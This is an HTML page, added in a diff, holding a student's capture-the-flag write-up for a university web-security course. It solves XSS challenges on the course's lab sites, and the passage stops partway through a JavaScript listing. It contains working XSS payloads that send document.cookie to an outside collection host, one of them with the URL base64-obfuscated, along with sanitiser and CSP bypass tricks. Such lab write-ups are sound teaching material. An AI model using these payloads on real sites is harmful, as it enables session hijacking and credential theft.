@@ -1,0 +1,404 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>Course CTF: Week 7 &amp; 8 - COMP6443 Musings</title><meta name=renderer content=webkit><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content=no-transform><meta http-equiv=cache-control content=no-siteapp><meta name=theme-color content=#f8f5ec><meta name=msapplication-navbutton-color content=#f8f5ec><meta name=apple-mobile-web-app-capable content=yes><meta name=apple-mobile-web-app-status-bar-style content=#f8f5ec><meta name=author content=z5206677><meta name=description content="User Profile Info Site: profile."><meta name=keywords content=Hugo,theme,even><meta name=generator content="Hugo 0.58.2 with theme even"><link rel=canonical href=../../../post/course-ctf/week7/><link rel=apple-touch-icon sizes=180x180 href=../../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../../favicon-16x16.png><link rel=manifest href=../../../manifest.json><link rel=mask-icon href=../../../safari-pinned-tab.svg color=#5bbad5><link href=../../../dist/even.c2a46f00.min.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><link rel=stylesheet href=../../../css/overrides.css><link rel=stylesheet href=../../../css/typedjs.shortcode.css><meta property=og:title content="Course CTF: Week 7 &amp; 8"><meta property=og:description content="User Profile Info Site: profile."><meta property=og:type content=article><meta property=og:url content=/post/course-ctf/week7/><meta property=article:published_time content=2020-07-15T11:09:45+10:00><meta property=article:modified_time content=2020-07-15T11:09:45+10:00><meta itemprop=name content="Course CTF: Week 7 &amp; 8"><meta itemprop=description content="User Profile Info Site: profile."><meta itemprop=datePublished content=2020-07-15T11:09:45&#43;10:00><meta itemprop=dateModified content=2020-07-15T11:09:45&#43;10:00><meta itemprop=wordCount content=3523><meta itemprop=keywords content><meta name=twitter:card content=summary><meta name=twitter:title content="Course CTF: Week 7 &amp; 8"><meta name=twitter:description content="User Profile Info Site: profile."><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script><script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=../../../ class=logo>COMP6443 Musings</a></div><div class=mobile-navbar-icon><span></span><span></span><span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=../../../><li class=mobile-menu-item>Home</li></a><a href=https://github.com/featherbear/UNSW-COMP6443><li class=mobile-menu-item>GitHub</li></a><a href=../../../categories/><li class=mobile-menu-item>Categories</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=../../../ class=logo>COMP6443 Musings</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=../../../>Home</a></li><li class=menu-item><a class=menu-item-link href=https://github.com/featherbear/UNSW-COMP6443>GitHub</a></li><li class=menu-item><a class=menu-item-link href=../../../categories/>Categories</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>Course CTF: Week 7 &amp; 8</h1><div class=post-meta><span class=post-time>2020-07-15</span><div class=post-category><a href=../../../categories/course-ctf/>Course CTF</a></div></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>Contents</h2><div class="post-toc-content always-active"><nav id=TableOfContents><ul><li><ul><li><a href=#user-profile-info>User Profile Info</a></li><li><a href=#science-today>Science Today</a><ul><li><a href=#reflected-xss>Reflected XSS</a></li><li><a href=#stored-xss>Stored XSS</a></li></ul></li><li><a href=#student-record>Student Record</a><ul><li><a href=#jsonp>JSONP</a></li><li><a href=#create>Create</a></li></ul></li><li><a href=#report>Report</a></li><li><a href=#csp>CSP</a><ul><li><a href=#challenge-1>Challenge 1</a></li><li><a href=#challenge-2>Challenge 2</a></li></ul></li><li><a href=#support-v2>Support V2</a></li></ul></li></ul></nav></div></div><div class=post-content><h2 id=user-profile-info>User Profile Info</h2><p>Site: profile.-QBSITE-</p><p>SVG payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-svg data-lang=svg><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-svg data-lang=svg><span class=cp>&lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt;</span>
+ 
+<span class=nt>&lt;svg</span> <span class=na>version=</span><span class=s>&#34;1.1&#34;</span> <span class=na>baseProfile=</span><span class=s>&#34;full&#34;</span> <span class=na>xmlns=</span><span class=s>&#34;http://www.w3.org/2000/svg&#34;</span><span class=nt>&gt;</span>
+<span class=nt>&lt;polygon</span> <span class=na>id=</span><span class=s>&#34;triangle&#34;</span> <span class=na>points=</span><span class=s>&#34;0,0 0,50 50,0&#34;</span> <span class=na>fill=</span><span class=s>&#34;#009900&#34;</span> <span class=na>stroke=</span><span class=s>&#34;#004400&#34;</span><span class=nt>/&gt;</span>
+<span class=nt>&lt;script</span> <span class=na>type=</span><span class=s>&#34;text/javascript&#34;</span><span class=nt>&gt;</span>
+<span class=nt>&lt;script&gt;</span>fetch(&#39;https://my.collection.site?x=&#39; + document.cookie)<span class=nt>&lt;/script&gt;</span>
+<span class=nt>&lt;/script&gt;</span>
+<span class=nt>&lt;/svg&gt;</span></code></pre></td></tr></table></div></div><p>Gets uploaded to <a href=https://profile.-QBSITE-/profileimage?1594777740>https://profile.-QBSITE-/profileimage?1594777740</a></p><p>Doesn&rsquo;t execute directly through the profile page loading, however we can tamper the /report button</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></pre></td><td class=lntd><pre class=chroma>POST /report HTTP/1.1
+Host: profile.-QBSITE-
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Content-Length: 29
+Origin: https://profile.-QBSITE-
+DNT: 1
+Connection: close
+Referer: https://profile.-QBSITE-/profile
+Cookie: flag=NO_FLAG_FOR_YOU
+Pragma: no-cache
+Cache-Control: no-cache
+
+path=/profileimage?1594777740</pre></td></tr></table></div></div><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h2 id=science-today>Science Today</h2><p>Site: science-today.-QBSITE-</p><h3 id=reflected-xss>Reflected XSS</h3><p>Perform a search with the payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>script</span><span class=p>/&gt;</span><span class=err>fetch(&#39;https://my.collection.site?x=&#39; + document.cookie);&lt;/script/&gt;</span></code></pre></td></tr></table></div></div><p>By reflection, a SCRIPT tag will be injected into the page.<br>The site performs some basic XSS prevention by stripping out the <code>onerror</code> and <code>onload</code> keywords, as well as <code>&lt;script&gt;</code>, but not <code>&lt;script/&gt;</code>!</p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><p>It also turns out that <code>img</code>, <code>onerror</code> and <code>onload</code> are not fully sanitised properly, so a payload like <code>&lt;iimgmg src=a ononerrorerror=alert('pwned!')&gt;</code> will work</p><h3 id=stored-xss>Stored XSS</h3><p>Submit a comment with the payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;a&#34;</span> <span class=na>onerror</span><span class=o>=</span><span class=s>&#34;fetch(&#39;https://my.collection.site?x=&#39; + document.cookie)&#34;</span> <span class=p>/&gt;</span></code></pre></td></tr></table></div></div><p>This will inject the IMG tag into the page, which will then execute on every page that contains that comment</p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><hr><h2 id=student-record>Student Record</h2><p>Site: sturec.-QBSITE-</p><p>The site is protected by the CSP Headers: <code>script-src 'self'; object-src 'none'; base-uri 'none';</code>.<br>Therefore, inline scripts will not be able to execute - however, scripts/resources that exist on the server (<code>self</code>) will run!</p><p>These resources include the following:</p><ul><li><code>/css/sticky-footer-navbar.css</code></li><li><code>/create.html</code></li><li><code>/js/helper.js</code></li><li><code>/students.jsonp</code></li></ul><p>The &ldquo;Last Name&rdquo; query is vulnerable to XSS provided our script is not inline, and points to one of the above&hellip;</p><h3 id=jsonp>JSONP</h3><p>JSONP allows us to send a query, whose results is executed by a callback function we supply.<br>If a site does not sanitise the callback function, we can inject our own function!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;/students.jsonp?q=&amp;callback=((results)=&gt;{/* YOUR CODE HERE */})&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span> </code></pre></td></tr></table></div></div><p>The server will then call our code, passing the results of the search into the <code>results</code> parameter!</p><p>The website seems to sanitise the <code>.</code> character - so in order to get the cookies, we can do <code>document['cookie']</code> instead of <code>document.cookie</code> (yay for everything being a dictionary/object in JS).</p><p>We can perform a search with the payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;/students.jsonp?q=&amp;callback=(()=&gt;{fetch(`${atob(&#39;aHR0cHM6Ly9teS5jb2xsZWN0aW9uLnNpdGU/eD0=&#39;)}${document[&#39;cookie&#39;]}`)})();//&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+<span class=c>&lt;!-- Code is slightly different to the template payload above... because I did it this way before making this writeup --&gt;</span></code></pre></td></tr></table></div></div><p>This will cause the payload to be reflected in the HTML, which executes a fetch.<br>And this works, because as per the CSP scripts from the same origin are considered trusted</p><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><h3 id=create>Create</h3><p>When creating a student through the <code>/user-create</code> endpoint - all of the fields are escaped.<br>This makes our <code>&lt;script&gt;</code> tags becomes <code>&amp;lt;script&amp;gt;</code> - nooo!</p><p>However, there is a field (that gets added through the <code>/js/helpers.js</code> script) which is vulnerable!<br>There <em>is</em> some sanitisation going on (regex replacer <code>/&lt;(?:\w+)\W+?[\w]/g</code>), but we can circumvent it easily.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=c>&lt;!-- BEFORE --&gt;</span>
+<span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nx>blahblahblah</span><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+
+<span class=c>&lt;!-- Inserting &#39;&lt;_&lt;_&#39; between the &#39;&lt;&#39; and &#39;s&#39; --&gt;</span>
+
+<span class=c>&lt;!-- AFTER --&gt;</span>
+<span class=err>&lt;</span><span class=p>&lt;</span><span class=nt>_</span><span class=err>&lt;</span><span class=na>_script</span><span class=p>&gt;</span>blahblahblah<span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span></code></pre></td></tr></table></div></div><p>We can then form our payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=err>&lt;</span><span class=p>&lt;</span><span class=nt>_</span><span class=err>&lt;</span><span class=na>_script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;/students.jsonp?q=&amp;callback=(()=&gt;{fetch(`${atob(&#39;aHR0cHM6Ly9teS5jb2xsZWN0aW9uLnNpdGU/eD0=&#39;)}${document[&#39;cookie&#39;]}`)})&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span></code></pre></td></tr></table></div></div><blockquote><p><code>COMP6443{-flag-redacted-}</code></p></blockquote><p><details></p><p><summary>Bored? Want to see what I tried? (it didn&rsquo;t work, and was way overcomplicated)</summary></p><p>The <code>/create.html?</code> and <code>/user-create</code> endpoints have a different CSP header to the rest of the website&hellip;</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><span class=lnt>1
+</span></pre></td><td class=lntd><pre class=chroma>Content-Security-Policy: script-src &#39;self&#39;; script-src-elem &#39;self&#39; &#39;unsafe-inline&#39;; script-src-attr &#39;none&#39;;</pre></td></tr></table></div></div><blockquote><p>This attempt worked locally, but didn&rsquo;t send the flag when reporting to admin.<br>It involved exploiting the fact that through the JSONP call, we can execute Javascript commands.<br>As the <code>/user-create</code> endpoint reflects our payload (during the duplicate user case); we could trigger inline Javascript (through the <code>lname</code> field) when that duplicate user error appears.<br>To get that error to exist, we will need to make the browser perform a POST request, and render the results - This attack vector can be entered through the <code>dcreat</code> field not being entirely sanitised.</p></blockquote><hr><p>The first thing to think about is the result of what we want.</p><p>When a POST request (containing a duplicate user) to <code>/user-create</code> is made; an error containing the reflected contents of <code>lname</code> will be rendered (and executed) - allowing us to capture the flag.</p><p>This payload will be the contents of the <code>lname</code> field in our bigger payload.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nx>fetch</span><span class=p>(</span><span class=sb>`https://my.collection.site/?x=</span><span class=si>${</span><span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span><span class=si>}</span><span class=sb>`</span><span class=p>)&lt;/</span><span class=nt>script</span><span class=p>&gt;</span></code></pre></td></tr></table></div></div><p>Next, since the <code>/user-create</code> endpoint is a POST method, there are only (roughly) two ways to POST in Javascript.</p><ul><li><code>fetch(..., {method: &quot;POST&quot;})</code></li><li>Submitting a HTML form</li></ul><p>Since the client would have to then parse and render contents of the result page - only the second method would be viable.</p><p>We would first need to inject the following HTML code into the page</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>form</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;/user-create&#34;</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;POST&#34;</span><span class=p>&gt;</span>
+  <span class=p>&lt;</span><span class=nt>input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;fname&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;FFFF&#34;</span><span class=p>&gt;</span>
+  <span class=p>&lt;</span><span class=nt>input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;lname&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&lt;script&gt;fetch(`https://my.collection.site/?x=${document.cookie}`)&lt;/script&gt;&#34;</span><span class=p>&gt;</span>
+  <span class=p>&lt;</span><span class=nt>input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;email&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;EEEE@EEEE&#34;</span><span class=p>&gt;</span>
+  <span class=p>&lt;</span><span class=nt>input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;mobile&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;11111111&#34;</span><span class=p>&gt;</span>
+  <span class=p>&lt;</span><span class=nt>input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;inputCity&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;CCCC&#34;</span><span class=p>&gt;</span>
+  <span class=p>&lt;</span><span class=nt>input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;inputState&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;SSSS&#34;</span><span class=p>&gt;</span>
+  <span class=p>&lt;</span><span class=nt>input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;inputZip&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;1111&#34;</span><span class=p>&gt;</span>
+  <span class=p>&lt;</span><span class=nt>input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;snormal&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;yes&#34;</span><span class=p>&gt;</span>
+  <span class=p>&lt;</span><span class=nt>input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;dcreat&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;DDDD&#34;</span><span class=p>&gt;</span>
+<span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span></code></pre></td></tr></table></div></div><p>We can manually submit this form, so that the email <code>EEEE@EEEE</code> will be registered, and cause subsequent submissions of the same data to give us our desired duplicate user exists error.</p><p>This form payload becomes the value of the <code>dcreat</code> field in yet another <code>/user-create</code> POST request.</p><p><strong>However</strong>, we do have to be mindful that there is a string sanitiser that is run against our payload.<br>This sanitiser is a regex string replacer with the following pattern <code>/&lt;(?:\w+)\W+?[\w]/g</code>.</p><p>Basically, it screws up your opening element tags, but with some trial and error, we can break this sanitisation by adding some characters between the opening <code>&lt;</code> and the first letter of the tag.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=c>&lt;!-- BEFORE --&gt;</span>
+<span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nx>blahblahblah</span><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+
+<span class=c>&lt;!-- Inserting &#39;&lt;_&lt;_&#39; between the &#39;&lt;&#39; and &#39;s&#39; --&gt;</span>
+
+<span class=c>&lt;!-- AFTER --&gt;</span>
+<span class=err>&lt;</span><span class=p>&lt;</span><span class=nt>_</span><span class=err>&lt;</span><span class=na>_script</span><span class=p>&gt;</span>blahblahblah<span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span></code></pre></td></tr></table></div></div><p>Applying this sanitisation bypass, we end up with our new payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=err>&lt;</span><span class=p>&lt;</span><span class=nt>_</span><span class=err>&lt;</span><span class=na>_form</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;/user-create&#34;</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;POST&#34;</span><span class=p>&gt;</span>
+  <span class=err>&lt;</span><span class=p>&lt;</span><span class=nt>_</span><span class=err>&lt;</span><span class=na>_input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;fname&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;FFFF&#34;</span><span class=p>&gt;</span>
+  <span class=err>&lt;</span><span class=p>&lt;</span><span class=nt>_</span><span class=err>&lt;</span><span class=na>_input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;lname&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&lt;&lt;_&lt;_script&gt;fetch(`https://my.collection.site/?x=${document.cookie}`)&lt;/script&gt;&#34;</span><span class=p>&gt;</span>
+  <span class=err>&lt;</span><span class=p>&lt;</span><span class=nt>_</span><span class=err>&lt;</span><span class=na>_input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;email&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;EEEE@EEEE&#34;</span><span class=p>&gt;</span>
+  <span class=err>&lt;</span><span class=p>&lt;</span><span class=nt>_</span><span class=err>&lt;</span><span class=na>_input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;mobile&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;11111111&#34;</span><span class=p>&gt;</span>
+  <span class=err>&lt;</span><span class=p>&lt;</span><span class=nt>_</span><span class=err>&lt;</span><span class=na>_input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;inputCity&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;CCCC&#34;</span><span class=p>&gt;</span>
+  <span class=err>&lt;</span><span class=p>&lt;</span><span class=nt>_</span><span class=err>&lt;</span><span class=na>_input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;inputState&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;SSSS&#34;</span><span class=p>&gt;</span>
+  <span class=err>&lt;</span><span class=p>&lt;</span><span class=nt>_</span><span class=err>&lt;</span><span class=na>_input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;inputZip&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;1111&#34;</span><span class=p>&gt;</span>
+  <span class=err>&lt;</span><span class=p>&lt;</span><span class=nt>_</span><span class=err>&lt;</span><span class=na>_input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;snormal&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;yes&#34;</span><span class=p>&gt;</span>
+  <span class=err>&lt;</span><span class=p>&lt;</span><span class=nt>_</span><span class=err>&lt;</span><span class=na>_input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;dcreat&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;DDDD&#34;</span><span class=p>&gt;</span>
+<span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span></code></pre></td></tr></table></div></div><p>We can then place this modified form code into the <code>dcreat</code> field in our second <code>/user-create</code> POST request.</p><p><em>I would recommend to set the <code>lname</code> field to something unique (I used <code>&quot;TOES&quot;</code>) so that it is easy to identify this payload later.</em><br><em>The other fields can be whatever is valid, so this POST request actually gets accepted.</em></p><p>After the payload has been accepted, we can browse to the home page of the website and inspect the source code, to see that our form has been reflected into the webpage.</p><p>Finally we can trigger a form submission through our JSONP exploit!<br>i.e. <code>document['querySelectorAll']('form')[1]['submit']()</code></p><p>Do note that the JSONP functionality only exists within a search.</p><blockquote><p>When not performing a search, the server returns the data together with the HTML.<br>When performing a search, the client queries and executes a JSONP query.</p></blockquote><p>Since our JSONP exploit gets executed before the page loads its helper functions, we need to insert the data manually ourselves - such as through <code>document.write(...)</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;/students.jsonp?q=TOES&amp;callback=((arr)=&gt;{document[&#39;write&#39;](arr[0][&#39;dcreat&#39;]);document[&#39;querySelectorAll&#39;](&#39;form&#39;)[1][&#39;submit&#39;]()})&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span></code></pre></td></tr></table></div></div><p>This payload writes the content of the <code>dcreat</code> key from the first item in the JSON result, and then executes the submit function on the form that should have then been created.</p><p>When we enter this payload into the search field, the browser will</p><ul><li>Query the server for users with a last name containing <code>&quot;TOES&quot;</code></li><li>Run a custom callback<ul><li>Render the contents of <code>dcreat</code> in the document (Creates a form!)</li><li>Submits the form</li></ul></li><li>Client will parse and render the duplicate user error page</li><li>The script payload inside <code>lname</code> will be executed</li><li>???</li><li>Profit</li></ul><blockquote><p>Too bad this didn&rsquo;t work - It was way overcomplicated&hellip;</p></blockquote><p></details></p><h2 id=report>Report</h2><p>Site: report.-QBSITE-</p><p><code>/robots.txt</code> reveals that there is a directory <code>/view</code>.</p><p>When we browse it, we get an error message saying <code>missing report id</code>.<br>Looks like we will need to pass some sort of ID as a path (<code>/view/&lt;ID&gt;</code>)</p><p>After we try to post a dummy payload (<code>name=a&amp;content=a</code>) to the <code>/report</code> endpoint, we get a cookie sent back to us.<br>Decoding this, we find a base64 encoded <code>md5</code> hash. If we use that as an ID (i.e. <code>/view/f85b9762-e7db-4223-aefd-e2fc6739e4c9</code>) we are brought to the contents of our payload. A <code>flag</code> cookie is also set, containing a base64 encoded string (<code>no flag for you</code>).</p><p>This cookie has the HTTP Only option set; so we won&rsquo;t be able to use Javascript methods.</p><p>Looking inside the view page, there is a script that sanitises the payload before rendering it as HTML code</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code class=language-js data-lang=js><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-js data-lang=js><span class=kd>let</span> <span class=nx>div</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>querySelector</span><span class=p>(</span><span class=s1>&#39;div[id=report]&#39;</span><span class=p>);</span>
+<span class=kd>let</span> <span class=nx>contents</span> <span class=o>=</span> <span class=nx>atob</span><span class=p>(</span><span class=s1>&#39;&lt;SOME BASE64 ENCODED STRING THAT CONTAINS YOUR CONTENT PAYLOAD&#39;</span><span class=p>);</span>
+
+<span class=c1>// https://www.reddit.com/r/programminghumor/comments/d0kb4e/my_favourite_language/
+</span><span class=c1></span>
+<span class=kd>let</span> <span class=nx>blacklisted_tags</span> <span class=o>=</span> <span class=p>[</span>
+    <span class=s1>&#39;script&#39;</span><span class=p>,</span>
+    <span class=s1>&#39;object&#39;</span><span class=p>,</span>
+<span class=p>];</span>
+
